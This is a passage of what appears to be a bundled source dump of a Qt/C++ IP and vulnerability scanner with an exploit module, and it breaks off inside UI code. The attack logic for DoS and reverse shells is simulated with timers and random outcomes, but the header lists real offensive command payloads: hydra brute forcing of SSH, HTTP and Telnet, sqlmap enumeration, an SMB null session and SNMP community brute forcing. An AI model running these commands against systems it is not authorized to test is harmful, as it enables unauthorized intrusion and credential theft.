m_result.output = \"Custom script execution failed or no vulnerability found\";\r\n    }\r\n}\r\n\r\nvoid ExploitWorker::executeDenialOfService()\r\n{\r\n    emit exploitProgress(m_exploit.id, 10, \"Preparing DoS attack...\");\r\n    QThread::msleep(500);\r\n\r\n    emit exploitProgress(m_exploit.id, 30, \"Sending malformed packets...\");\r\n    QThread::msleep(1000);\r\n\r\n    emit exploitProgress(m_exploit.id, 60, \"Flooding target service...\");\r\n    QThread::msleep(2000);\r\n\r\n    emit exploitProgress(m_exploit.id, 90, \"Checking service availability...\");\r\n    QThread::msleep(1000);\r\n\r\n    // DoS attacks usually have high success rate but limited usefulness\r\n    if (QRandomGenerator::global()->bounded(100) < 80) {\r\n        m_result.successful = true;\r\n        m_result.gainedAccess = \"Service Disruption\";\r\n        m_result.output = \"Denial of Service attack successful\\n\";\r\n        m_result.output += \"Target service appears to be unresponsive\\n\";\r\n        m_result.output += \"Service may have crashed or become unstable\\n\";\r\n    } else {\r\n        m_result.output = \"DoS attack failed\\nTarget service remains responsive\";\r\n    }\r\n}\r\n\r\nvoid ExploitWorker::extractSystemInfo()\r\n{\r\n    emit exploitProgress(m_exploit.id, 85, \"Extracting system information...\");\r\n\r\n    // Simulate system information extraction\r\n    m_result.extractedData << \"OS: Linux Ubuntu 20.04\"\r\n                           << \"Kernel: 5.4.0-74-generic\"\r\n                           << \"Architecture: x86_64\"\r\n                           << \"Uptime: 15 days\"\r\n                           << \"Users: root, www-data, ubuntu\";\r\n\r\n    m_result.sessionInfo = QString(\"Active session on %1:%2\").arg(m_targetIp).arg(m_vulnerability.port);\r\n}\r\n\r\nvoid ExploitWorker::establishReverseShell()\r\n{\r\n    emit exploitProgress(m_exploit.id, 90, \"Establishing reverse shell...\");\r\n\r\n    // Simulate reverse shell establishment\r\n    m_result.shellType = \"Bash\";\r\n    m_result.connectionPort = 4444;\r\n    m_result.sessionInfo = QString(\"Reverse shell connected from %1\").arg(m_targetIp);\r\n\r\n    emit shellObtained(m_exploit.id, m_result.sessionInfo);\r\n}\r\n\r\nQString ExploitDialog::generateJSONExploitReport()\r\n{\r\n    QJsonObject root;\r\n    root[\"scanner\"] = \"Advanced IP Scanner\";\r\n    root[\"module\"] = \"Exploit Execution\";\r\n    root[\"version\"] = \"2.0\";\r\n    root[\"timestamp\"] = QDateTime::currentDateTime().toString(Qt::ISODate);\r\n\r\n    // Target info\r\n    QJsonObject targetObj;\r\n    targetObj[\"service\"] = m_vulnerability.service;\r\n    targetObj[\"port\"] = m_vulnerability.port;\r\n    targetObj[\"vulnerability\"] = m_vulnerability.title;\r\n    targetObj[\"severity\"] = static_cast<int>(m_vulnerability.severity);\r\n    root[\"target\"] = targetObj;\r\n\r\n    // Results\r\n    QJsonArray resultsArray;\r\n    for (const ExploitResult &result : m_exploitResults) {\r\n        QJsonObject resultObj;\r\n        resultObj[\"exploitId\"] = result.exploitId;\r\n        resultObj[\"targetIp\"] = result.targetIp;\r\n        resultObj[\"targetPort\"] = result.targetPort;\r\n        resultObj[\"successful\"] = result.successful;\r\n        resultObj[\"output\"] = result.output;\r\n        resultObj[\"errorMessage\"] = result.errorMessage;\r\n        resultObj[\"executionTime\"] = result.executionTime.toString(Qt::ISODate);\r\n        resultObj[\"gainedAccess\"] = result.gainedAccess;\r\n        resultObj[\"sessionInfo\"] = result.sessionInfo;\r\n        resultObj[\"shellType\"] = result.shellType;\r\n        resultObj[\"connectionPort\"] = result.connectionPort;\r\n\r\n        QJsonArray extractedArray;\r\n        for (const QString &data : result.extractedData) {\r\n            extractedArray.append(data);\r\n        }\r\n        resultObj[\"extractedData\"] = extractedArray;\r\n\r\n        resultsArray.append(resultObj);\r\n    }\r\n    root[\"results\"] = resultsArray;\r\n\r\n    QJsonDocument doc(root);\r\n    return doc.toJson();\r\n}\r\n\r\nQString ExploitDialog::generateTextExploitReport()\r\n{\r\n    QString report;\r\n    report += \"🔥 EXPLOIT EXECUTION REPORT\\n\";\r\n    report += \"============================\\n\\n\";\r\n    report += QString(\"Generated: %1\\n\").arg(QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n    report += QString(\"Target Service: %1:%2\\n\").arg(m_vulnerability.service).arg(m_vulnerability.port);\r\n    report += QString(\"Vulnerability: %1\\n\\n\").arg(m_vulnerability.title);\r\n\r\n    for (int i = 0; i < m_exploitResults.size(); ++i) {\r\n        const ExploitResult &result = m_exploitResults[i];\r\n\r\n        report += QString(\"--- EXPLOIT %1 ---\\n\").arg(i + 1);\r\n        report += QString(\"Exploit ID: %1\\n\").arg(result.exploitId);\r\n        report += QString(\"Target: %1:%2\\n\").arg(result.targetIp).arg(result.targetPort);\r\n        report += QString(\"Status: %1\\n\").arg(result.successful ? \"SUCCESS\" : \"FAILED\");\r\n        report += QString(\"Execution Time: %1\\n\").arg(result.executionTime.toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n\r\n        if (result.successful) {\r\n            report += QString(\"Access Gained: %1\\n\").arg(result.gainedAccess);\r\n            if (!result.sessionInfo.isEmpty()) {\r\n                report += QString(\"Session: %1\\n\").arg(result.sessionInfo);\r\n            }\r\n            if (!result.extractedData.isEmpty()) {\r\n                report += \"Extracted Data:\\n\";\r\n                for (const QString &data : result.extractedData) {\r\n                    report += QString(\"  - %1\\n\").arg(data);\r\n                }\r\n            }\r\n        } else {\r\n            report += QString(\"Error: %1\\n\").arg(result.errorMessage);\r\n        }\r\n\r\n        report += \"\\nOutput:\\n\";\r\n        report += result.output;\r\n        report += \"\\n\\n\";\r\n    }\r\n\r\n    report += \"=== END OF REPORT ===\\n\";\r\n    return report;\r\n}\r\n\r\nExploitInfo ExploitDatabase::getExploitById(const QString &id)\r\n{\r\n    for (const ExploitInfo &exploit : m_exploits) {\r\n        if (exploit.id == id) {\r\n            return exploit;\r\n        }\r\n    }\r\n    return ExploitInfo(); // Return empty exploit if not found\r\n}\r\n\r\nvoid ExploitDatabase::loadExploitsFromFile()\r\n{\r\n    // Load additional exploits from configuration file\r\n    QString configPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);\r\n    QDir configDir(configPath);\r\n    if (!configDir.exists()) {\r\n        configDir.mkpath(\".\");\r\n    }\r\n\r\n    QString exploitFile = configDir.filePath(\"custom_exploits.json\");\r\n    QFile file(exploitFile);\r\n\r\n    if (file.exists() && file.open(QIODevice::ReadOnly)) {\r\n        QJsonDocument doc = QJsonDocument::fromJson(file.readAll());\r\n        QJsonArray exploitsArray = doc.array();\r\n\r\n        for (const auto &value : exploitsArray) {\r\n            QJsonObject exploitObj = value.toObject();\r\n\r\n            ExploitInfo exploit;\r\n            exploit.id = exploitObj[\"id\"].toString();\r\n            exploit.name = exploitObj[\"name\"].toString();\r\n            exploit.description = exploitObj[\"description\"].toString();\r\n            exploit.type = static_cast<ExploitType>(exploitObj[\"type\"].toInt());\r\n            exploit.targetService = exploitObj[\"targetService\"].toString();\r\n            exploit.targetPort = exploitObj[\"targetPort\"].toInt();\r\n            exploit.payload = exploitObj[\"payload\"].toString();\r\n            exploit.requirements = exploitObj[\"requirements\"].toString();\r\n            exploit.author = exploitObj[\"author\"].toString();\r\n            exploit.successRate = exploitObj[\"successRate\"].toDouble();\r\n            exploit.requiresAuth = exploitObj[\"requiresAuth\"].toBool();\r\n            exploit.difficulty = exploitObj[\"difficulty\"].toString();\r\n            exploit.metasploitModule = exploitObj[\"metasploitModule\"].toString();\r\n            exploit.customScript = exploitObj[\"customScript\"].toString();\r\n            exploit.cveId = exploitObj[\"cveId\"].toString();\r\n\r\n            m_exploits.append(exploit);\r\n        }\r\n    }\r\n}\r\n\r\nvoid ExploitDatabase::addCustomExploit(const ExploitInfo &exploit)\r\n{\r\n    m_exploits.append(exploit);\r\n\r\n    // Save to file\r\n    QString configPath = QStandardPaths::writableLocation(QStandardPaths::ConfigLocation);\r\n    QString exploitFile = QDir(configPath).filePath(\"custom_exploits.json\");\r\n\r\n    QJsonArray exploitsArray;\r\n    for (const ExploitInfo &exp : m_exploits) {\r\n        if (exp.author == \"Custom\") { // Only save custom exploits\r\n            QJsonObject exploitObj;\r\n            exploitObj[\"id\"] = exp.id;\r\n            exploitObj[\"name\"] = exp.name;\r\n            exploitObj[\"description\"] = exp.description;\r\n            exploitObj[\"type\"] = static_cast<int>(exp.type);\r\n            exploitObj[\"targetService\"] = exp.targetService;\r\n            exploitObj[\"targetPort\"] = exp.targetPort;\r\n            exploitObj[\"payload\"] = exp.payload;\r\n            exploitObj[\"requirements\"] = exp.requirements;\r\n            exploitObj[\"author\"] = exp.author;\r\n            exploitObj[\"successRate\"] = exp.successRate;\r\n            exploitObj[\"requiresAuth\"] = exp.requiresAuth;\r\n            exploitObj[\"difficulty\"] = exp.difficulty;\r\n            exploitObj[\"metasploitModule\"] = exp.metasploitModule;\r\n            exploitObj[\"customScript\"] = exp.customScript;\r\n            exploitObj[\"cveId\"] = exp.cveId;\r\n\r\n            exploitsArray.append(exploitObj);\r\n        }\r\n    }\r\n\r\n    QJsonDocument doc(exploitsArray);\r\n    QFile file(exploitFile);\r\n    if (file.open(QIODevice::WriteOnly)) {\r\n        file.write(doc.toJson());\r\n    }\r\n}\r\n",
          "relativePath": "exploitsystem.cpp"
        },
        {
          "name": "exploitsystem.h",
          "type": "file",
          "content": "#ifndef EXPLOITSYSTEM_H\r\n#define EXPLOITSYSTEM_H\r\n\r\n#include <QtCore/QObject>\r\n#include <QtCore/QThread>\r\n#include <QtCore/QRunnable>\r\n#include <QtCore/QDateTime>\r\n#include <QtNetwork/QTcpSocket>\r\n#include <QtNetwork/QUdpSocket>\r\n#include <QtCore/QProcess>\r\n#include <QtWidgets/QDialog>\r\n#include <QtWidgets/QTextEdit>\r\n#include <QtWidgets/QProgressBar>\r\n#include <QtWidgets/QPushButton>\r\n#include <QtWidgets/QVBoxLayout>\r\n#include <QtWidgets/QHBoxLayout>\r\n#include <QtWidgets/QLabel>\r\n#include <QtWidgets/QComboBox>\r\n#include <QtWidgets/QCheckBox>\r\n#include <QtWidgets/QGroupBox>\r\n#include <QtWidgets/QTabWidget>\r\n#include <QtWidgets/QTableWidget>\r\n#include <QtWidgets/QHeaderView>\r\n#include <QtWidgets/QSpinBox>\r\n#include <QtWidgets/QLineEdit>\r\n#include \"VulnerabilityScanner.h\"\r\n#include <QTreeWidget>\r\n#include \"ipscanner.h\"\r\n\r\nenum class ExploitType {\r\n    CREDENTIAL_ATTACK,\r\n    BUFFER_OVERFLOW,\r\n    SQL_INJECTION,\r\n    XSS_ATTACK,\r\n    COMMAND_INJECTION,\r\n    PRIVILEGE_ESCALATION,\r\n    DENIAL_OF_SERVICE,\r\n    METASPLOIT_MODULE,\r\n    CUSTOM_SCRIPT\r\n};\r\n\r\nstruct ExploitInfo {\r\n    QString id;\r\n    QString name;\r\n    QString description;\r\n    ExploitType type;\r\n    QString targetService;\r\n    int targetPort;\r\n    QString payload;\r\n    QString requirements;\r\n    QString author;\r\n    QDateTime created;\r\n    QString cveId;\r\n    double successRate;\r\n    bool requiresAuth;\r\n    QString difficulty; // \"easy\", \"medium\", \"hard\", \"expert\"\r\n    QStringList platforms;\r\n    QString metasploitModule;\r\n    QString customScript;\r\n};\r\n\r\nstruct ExploitResult {\r\n    QString exploitId;\r\n    QString targetIp;\r\n    int targetPort;\r\n    bool successful;\r\n    QString output;\r\n    QString errorMessage;\r\n    QDateTime executionTime;\r\n    QString sessionInfo;\r\n    QString gainedAccess;\r\n    QStringList extractedData;\r\n    QString shellType;\r\n    int connectionPort;\r\n};\r\n\r\nclass ExploitWorker : public QObject, public QRunnable\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    ExploitWorker(const VulnerabilityInfo &vulnerability, const ExploitInfo &exploit, const QString &targetIp);\r\n    void run() override;\r\n\r\nsignals:\r\n    void exploitStarted(const QString &exploitId, const QString &target);\r\n    void exploitProgress(const QString &exploitId, int percentage, const QString &status);\r\n    void exploitCompleted(const QString &exploitId, const ExploitResult &result);\r\n    void exploitFailed(const QString &exploitId, const QString &error);\r\n    void shellObtained(const QString &exploitId, const QString &shellInfo);\r\n\r\nprivate:\r\n    void executeCredentialAttack();\r\n    void executeBufferOverflow();\r\n    void executeSQLInjection();\r\n    void executeCommandInjection();\r\n    void executeMetasploitModule();\r\n    void executeCustomScript();\r\n    void executeDenialOfService();\r\n\r\n    // Helper methods\r\n    bool connectToTarget();\r\n    void sendPayload(const QString &payload);\r\n    QString receiveResponse();\r\n    bool checkExploitSuccess();\r\n    void extractSystemInfo();\r\n    void establishReverseShell();\r\n\r\n    VulnerabilityInfo m_vulnerability;\r\n    ExploitInfo m_exploit;\r\n    QString m_targetIp;\r\n    QTcpSocket *m_socket;\r\n    ExploitResult m_result;\r\n    QProcess *m_process;\r\n};\r\n\r\nclass ExploitDialog : public QDialog\r\n{\r\n    Q_OBJECT\r\n\r\npublic:\r\n    ExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent = nullptr);\r\n    ~ExploitDialog();\r\n\r\nprivate slots:\r\n    void loadAvailableExploits();\r\n    void onExploitSelected();\r\n    void runSelectedExploit();\r\n    void stopExploit();\r\n    void onExploitStarted(const QString &exploitId, const QString &target);\r\n    void onExploitProgress(const QString &exploitId, int percentage, const QString &status);\r\n    void onExploitCompleted(const QString &exploitId, const ExploitResult &result);\r\n    void onExploitFailed(const QString &exploitId, const QString &error);\r\n    void onShellObtained(const QString &exploitId, const QString &shellInfo);\r\n    void saveExploitResults();\r\n    void openReverseShell();\r\n\r\nprivate:\r\n    void setupUI();\r\n    void setupExploitList();\r\n    void updateExploitDetails();\r\n    QStringList getMetasploitModules(const QString &service, int port);\r\n    void showWarningDialog();\r\n\r\n    VulnerabilityInfo m_vulnerability;\r\n\r\n    // UI Components\r\n    QTabWidget *m_tabWidget;\r\n\r\n    // Exploit Selection Tab\r\n    QTableWidget *m_exploitTable;\r\n    QTextEdit *m_exploitDetails;\r\n    QPushButton *m_runExploitButton;\r\n    QPushButton *m_stopExploitButton;\r\n    QLabel *m_statusLabel;\r\n    QProgressBar *m_progressBar;\r\n\r\n    // Configuration Tab\r\n    QLineEdit *m_payloadEdit;\r\n    QSpinBox *m_timeoutSpinBox;\r\n    QCheckBox *m_reverseShellCheckBox;\r\n    QLineEdit *m_listenerPortEdit;\r\n    QComboBox *m_shellTypeCombo;\r\n    QCheckBox *m_verboseOutputCheckBox;\r\n\r\n    // Results Tab\r\n    QTextEdit *m_outputEdit;\r\n    QTextEdit *m_errorEdit;\r\n    QTableWidget *m_sessionTable;\r\n    QPushButton *m_saveResultsButton;\r\n    QPushButton *m_openShellButton;\r\n\r\n    QList<ExploitInfo> m_availableExploits;\r\n    ExploitInfo m_selectedExploit;\r\n    ExploitWorker *m_currentWorker;\r\n    QList<ExploitResult> m_exploitResults;\r\n    bool m_exploitRunning;\r\n};\r\n\r\nclass ExploitDatabase\r\n{\r\npublic:\r\n    static ExploitDatabase* instance();\r\n\r\n    QList<ExploitInfo> getExploitsForVulnerability(const VulnerabilityInfo &vuln);\r\n    QList<ExploitInfo> getExploitsForService(const QString &service, int port);\r\n    ExploitInfo getExploitById(const QString &id);\r\n\r\n    void addCustomExploit(const ExploitInfo &exploit);\r\n    void updateExploitDatabase();\r\n    void loadMetasploitModules();\r\n\r\nprivate:\r\n    ExploitDatabase();\r\n    void initializeBuiltinExploits();\r\n    void loadExploitsFromFile();\r\n\r\n    static ExploitDatabase* s_instance;\r\n    QList<ExploitInfo> m_exploits;\r\n    QMap<QString, QString> m_metasploitModules;\r\n};\r\n\r\n// Built-in exploits for common vulnerabilities\r\nclass BuiltinExploits\r\n{\r\npublic:\r\n    // SSH Brute Force\r\n    static ExploitInfo createSSHBruteForce() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"ssh_bruteforce_001\";\r\n        exploit.name = \"SSH Brute Force Attack\";\r\n        exploit.description = \"Attempts to brute force SSH credentials using common username/password combinations\";\r\n        exploit.type = ExploitType::CREDENTIAL_ATTACK;\r\n        exploit.targetService = \"SSH\";\r\n        exploit.targetPort = 22;\r\n        exploit.payload = \"hydra -L userlist.txt -P passlist.txt {target} ssh\";\r\n        exploit.requirements = \"Hydra tool, username/password lists\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.3;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"easy\";\r\n        exploit.platforms << \"Linux\" << \"Unix\" << \"Windows\";\r\n        return exploit;\r\n    }\r\n\r\n    // Weak FTP Login\r\n    static ExploitInfo createFTPBruteForce() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"ftp_bruteforce_001\";\r\n        exploit.name = \"FTP Brute Force Attack\";\r\n        exploit.description = \"Tests common FTP credentials and anonymous login\";\r\n        exploit.type = ExploitType::CREDENTIAL_ATTACK;\r\n        exploit.targetService = \"FTP\";\r\n        exploit.targetPort = 21;\r\n        exploit.payload = \"ftp_brute_force_script.py\";\r\n        exploit.requirements = \"Python, ftplib\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.4;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"easy\";\r\n        exploit.platforms << \"All\";\r\n        return exploit;\r\n    }\r\n\r\n    // HTTP Basic Auth Brute Force\r\n    static ExploitInfo createHTTPBruteForce() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"http_basicauth_001\";\r\n        exploit.name = \"HTTP Basic Auth Brute Force\";\r\n        exploit.description = \"Brute forces HTTP Basic Authentication\";\r\n        exploit.type = ExploitType::CREDENTIAL_ATTACK;\r\n        exploit.targetService = \"HTTP\";\r\n        exploit.targetPort = 80;\r\n        exploit.payload = \"hydra -L users.txt -P pass.txt {target} http-get /\";\r\n        exploit.requirements = \"Hydra, wordlists\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.25;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"easy\";\r\n        exploit.platforms << \"All\";\r\n        return exploit;\r\n    }\r\n\r\n    // SQL Injection Test\r\n    static ExploitInfo createSQLInjection() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"sql_injection_001\";\r\n        exploit.name = \"SQL Injection Test\";\r\n        exploit.description = \"Tests for SQL injection vulnerabilities in web forms\";\r\n        exploit.type = ExploitType::SQL_INJECTION;\r\n        exploit.targetService = \"HTTP\";\r\n        exploit.targetPort = 80;\r\n        exploit.payload = \"sqlmap -u {target} --batch --dbs\";\r\n        exploit.requirements = \"SQLMap tool\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.15;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"medium\";\r\n        exploit.platforms << \"All\";\r\n        return exploit;\r\n    }\r\n\r\n    // SMB Null Session\r\n    static ExploitInfo createSMBNullSession() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"smb_null_session_001\";\r\n        exploit.name = \"SMB Null Session\";\r\n        exploit.description = \"Attempts to establish SMB null session for information gathering\";\r\n        exploit.type = ExploitType::PRIVILEGE_ESCALATION;\r\n        exploit.targetService = \"SMB\";\r\n        exploit.targetPort = 445;\r\n        exploit.payload = \"smbclient -L {target} -N\";\r\n        exploit.requirements = \"Samba client tools\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.2;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"easy\";\r\n        exploit.platforms << \"Windows\";\r\n        return exploit;\r\n    }\r\n\r\n    // Telnet Brute Force\r\n    static ExploitInfo createTelnetBruteForce() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"telnet_bruteforce_001\";\r\n        exploit.name = \"Telnet Brute Force\";\r\n        exploit.description = \"Brute forces Telnet login credentials\";\r\n        exploit.type = ExploitType::CREDENTIAL_ATTACK;\r\n        exploit.targetService = \"Telnet\";\r\n        exploit.targetPort = 23;\r\n        exploit.payload = \"hydra -L users.txt -P pass.txt {target} telnet\";\r\n        exploit.requirements = \"Hydra, wordlists\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.35;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"easy\";\r\n        exploit.platforms << \"All\";\r\n        return exploit;\r\n    }\r\n\r\n    // SNMP Community String Brute Force\r\n    static ExploitInfo createSNMPBruteForce() {\r\n        ExploitInfo exploit;\r\n        exploit.id = \"snmp_bruteforce_001\";\r\n        exploit.name = \"SNMP Community String Brute Force\";\r\n        exploit.description = \"Tests common SNMP community strings\";\r\n        exploit.type = ExploitType::CREDENTIAL_ATTACK;\r\n        exploit.targetService = \"SNMP\";\r\n        exploit.targetPort = 161;\r\n        exploit.payload = \"onesixtyone -c community.txt {target}\";\r\n        exploit.requirements = \"onesixtyone tool\";\r\n        exploit.author = \"Built-in\";\r\n        exploit.successRate = 0.3;\r\n        exploit.requiresAuth = false;\r\n        exploit.difficulty = \"easy\";\r\n        exploit.platforms << \"All\";\r\n        return exploit;\r\n    }\r\n};\r\n\r\n// Integration into main IpScanner class\r\nclass IpScannerExploitExtension\r\n{\r\npublic:\r\n    static void addExploitContextMenu(QTreeWidget *vulnerabilityTree, IpScanner *scanner);\r\n    static void showExploitDialog(const VulnerabilityInfo &vulnerability, QWidget *parent);\r\n    static void runQuickExploit(const VulnerabilityInfo &vulnerability, const QString &exploitId);\r\n};\r\n\r\n#endif // EXPLOITSYSTEM_H\r\n",
          "relativePath": "exploitsystem.h"
        },
        {
          "name": "ipscanner.cpp",
          "type": "file",
          "content": "#include \"IpScanner.h\"\r\n#include \"ScanWorkers.h\"\r\n#include <QtCore/QDebug>\r\n#include <QtCore/QProcess>\r\n#include <QtCore/QRegularExpression>\r\n#include <QtWidgets/QApplication>\r\n#include <QtWidgets/QHeaderView>\r\n#include <QtCore/QStandardPaths>\r\n#include <QtGui/QClipboard>\r\n#include <QtCore/QUrl>\r\n#include <QtGui/QDesktopServices>\r\n#include <QProgressDialog>\r\n\r\nIpScanner::IpScanner(QWidget *parent)\r\n    : QMainWindow(parent), scanRunning(false), scanPaused(false),\r\n    totalHosts(0), scannedHosts(0), completedHosts(0)\r\n{\r\n    threadPool = QThreadPool::globalInstance();\r\n    threadPool->setMaxThreadCount(50);\r\n\r\n    settings = new QSettings(\"IpScanner\", \"Config\", this);\r\n\r\n    setupUI();\r\n    setupMenuBar();\r\n    setupStatusBar();\r\n    loadSettings();\r\n\r\n    // Timer für UI Updates\r\n    updateTimer = new QTimer(this);\r\n    connect(updateTimer, &QTimer::timeout, this, &IpScanner::updateProgress);\r\n\r\n    // Timer für Scan-Fortschritt\r\n    progressTimer = new QTimer(this);\r\n    connect(progressTimer, &QTimer::timeout, this, &IpScanner::updateScanProgress);\r\n}\r\n\r\nIpScanner::~IpScanner()\r\n{\r\n    try {\r\n        saveSettings();\r\n\r\n        // Stop any running vulnerability scans\r\n        if (vulnerabilityScanRunning) {\r\n            stopVulnerabilitySccan();\r\n        }\r\n\r\n        // WICHTIG: Alle laufenden Scans stoppen\r\n        if (scanRunning) {\r\n            stopScan();\r\n        }\r\n\r\n        // ThreadPool sicher beenden\r\n        if (threadPool) {\r\n            threadPool->clear();\r\n            threadPool->waitForDone(5000); // 5 Sekunden Timeout\r\n        }\r\n\r\n        // Timer stoppen\r\n        if (updateTimer) {\r\n            updateTimer->stop();\r\n        }\r\n        if (progressTimer) {\r\n            progressTimer->stop();\r\n        }\r\n\r\n    } catch (...) {\r\n        // Ignore exceptions in destructor\r\n    }\r\n}\r\n\r\nvoid IpScanner::setupUI()\r\n{\r\n    centralWidget = new QWidget(this);\r\n    setCentralWidget(centralWidget);\r\n\r\n    // Main layout\r\n    QVBoxLayout *mainLayout = new QVBoxLayout(centralWidget);\r\n\r\n    // Create main splitter\r\n    mainSplitter = new QSplitter(Qt::Horizontal, this);\r\n\r\n    // Create tab widget\r\n    mainTabWidget = new QTabWidget(this);\r\n\r\n    createScanTab();\r\n    createResultsTab();\r\n    createPortScanTab();\r\n    createNetworkTab();\r\n    createVulnerabilityTab();\r\n    createLogTab();\r\n\r\n    mainSplitter->addWidget(mainTabWidget);\r\n    mainLayout->addWidget(mainSplitter);\r\n\r\n    // Window properties\r\n    setWindowTitle(\"Advanced IP Scanner v2.0 - Verbessert\");\r\n    setMinimumSize(1200, 800);\r\n    resize(1600, 1000);\r\n\r\n    // Verbessertes Dark Theme\r\n    setStyleSheet(R\"(\r\n        QMainWindow {\r\n            background-color: #1e1e1e;\r\n            color: #ffffff;\r\n        }\r\n        QTabWidget::pane {\r\n            border: 1px solid #404040;\r\n            background-color: #2d2d2d;\r\n            border-radius: 5px;\r\n        }\r\n        QTabBar::tab {\r\n            background-color: #404040;\r\n            color: #fff;\r\n            padding: 10px 20px;\r\n            margin: 2px;\r\n            border-radius: 5px;\r\n            font-weight: bold;\r\n        }\r\n        QTabBar::tab:selected {\r\n            background-color: #0078d4;\r\n            color: white;\r\n        }\r\n        QTabBar::tab:hover {\r\n            background-color: #505050;\r\n        }\r\n        QTreeWidget {\r\n            background-color: #2d2d2d;\r\n            color: #fff;\r\n            gridline-color: #404040;\r\n            border: 1px solid #404040;\r\n            border-radius: 5px;\r\n            font-size: 11px;\r\n        }\r\n        QTreeWidget::item {\r\n            padding: 5px;\r\n            border-bottom: 1px solid #404040;\r\n        }\r\n        QTreeWidget::item:selected {\r\n            background-color: #0078d4;\r\n            color: white;\r\n        }\r\n        QTreeWidget::item:hover {\r\n            background-color: #404040;\r\n        }\r\n        QPushButton {\r\n            background-color: #0078d4;\r\n            color: white;\r\n            border: none;\r\n            padding: 10px 20px;\r\n            border-radius: 5px;\r\n            font-weight: bold;\r\n            min-width: 100px;\r\n        }\r\n        QPushButton:hover {\r\n            background-color: #106ebe;\r\n        }\r\n        QPushButton:pressed {\r\n            background-color: #005a9e;\r\n        }\r\n        QPushButton:disabled {\r\n            background-color: #666666;\r\n            color: #999999;\r\n        }\r\n        QLineEdit, QSpinBox, QComboBox {\r\n            background-color: #404040;\r\n            color: #fff;\r\n            border: 1px solid #606060;\r\n            padding: 8px;\r\n            border-radius: 5px;\r\n            font-size: 11px;\r\n        }\r\n        QLineEdit:focus, QSpinBox:focus, QComboBox:focus {\r\n            border: 2px solid #0078d4;\r\n        }\r\n        QTextEdit {\r\n            background-color: #2d2d2d;\r\n            color: #fff;\r\n            border: 1px solid #404040;\r\n            border-radius: 5px;\r\n            font-family: 'Consolas', 'Courier New', monospace;\r\n            font-size: 10px;\r\n        }\r\n        QGroupBox {\r\n            font-weight: bold;\r\n            border: 2px solid #404040;\r\n            margin: 15px 0;\r\n            padding-top: 15px;\r\n            border-radius: 5px;\r\n            background-color: #252525;\r\n        }\r\n        QGroupBox::title {\r\n            subcontrol-origin: margin;\r\n            left: 15px;\r\n            padding: 5px 10px;\r\n            background-color: #0078d4;\r\n            color: white;\r\n            border-radius: 3px;\r\n        }\r\n        QProgressBar {\r\n            border: 1px solid #404040;\r\n            border-radius: 5px;\r\n            text-align: center;\r\n            font-weight: bold;\r\n            background-color: #2d2d2d;\r\n            color: white;\r\n            height: 25px;\r\n        }\r\n        QProgressBar::chunk {\r\n            background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0,\r\n                stop:0 #0078d4, stop:1 #106ebe);\r\n            border-radius: 4px;\r\n        }\r\n        QLabel {\r\n            color: #ffffff;\r\n            font-size: 11px;\r\n        }\r\n        QStatusBar {\r\n            background-color: #1e1e1e;\r\n            color: #ffffff;\r\n            border-top: 1px solid #404040;\r\n        }\r\n    )\");\r\n}\r\n\r\nvoid IpScanner::createScanTab()\r\n{\r\n    scanTab = new QWidget();\r\n    mainTabWidget->addTab(scanTab, \"🔍 Scan Konfiguration\");\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(scanTab);\r\n\r\n    // Target configuration group\r\n    QGroupBox *targetGroup = new QGroupBox(\"🎯 Ziel Konfiguration\");\r\n    QGridLayout *targetLayout = new QGridLayout(targetGroup);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Ziel:\"), 0, 0);\r\n    targetEdit = new QLineEdit(\"192.168.1.1-254\");\r\n    targetEdit->setPlaceholderText(\"IP Bereich (z.B. 192.168.1.1-254, 10.0.0.0/24)\");\r\n    targetLayout->addWidget(targetEdit, 0, 1, 1, 3);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Scan Typ:\"), 1, 0);\r\n    scanTypeCombo = new QComboBox();\r\n    scanTypeCombo->addItems({\"Schneller Scan\", \"Detaillierter Scan\", \"Stealth Scan\", \"Aggressiver Scan\"});\r\n    targetLayout->addWidget(scanTypeCombo, 1, 1);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Threads:\"), 1, 2);\r\n    threadsSpinBox = new QSpinBox();\r\n    threadsSpinBox->setRange(1, 200);\r\n    threadsSpinBox->setValue(50);\r\n    targetLayout->addWidget(threadsSpinBox, 1, 3);\r\n\r\n    targetLayout->addWidget(new QLabel(\"Timeout (ms):\"), 2, 0);\r\n    timeoutSpinBox = new QSpinBox();\r\n    timeoutSpinBox->setRange(100, 10000);\r\n    timeoutSpinBox->setValue(3000);\r\n    targetLayout->addWidget(timeoutSpinBox, 2, 1);\r\n\r\n    // Scan options group\r\n    QGroupBox *optionsGroup = new QGroupBox(\"⚙️ Scan Optionen\");\r\n    QGridLayout *optionsLayout = new QGridLayout(optionsGroup);\r\n\r\n    pingCheckBox = new QCheckBox(\"Ping Scan\");\r\n    pingCheckBox->setChecked(true);\r\n    optionsLayout->addWidget(pingCheckBox, 0, 0);\r\n\r\n    portScanCheckBox = new QCheckBox(\"Port Scan\");\r\n    optionsLayout->addWidget(portScanCheckBox, 0, 1);\r\n\r\n    osDetectionCheckBox = new QCheckBox(\"OS Erkennung\");\r\n    optionsLayout->addWidget(osDetectionCheckBox, 1, 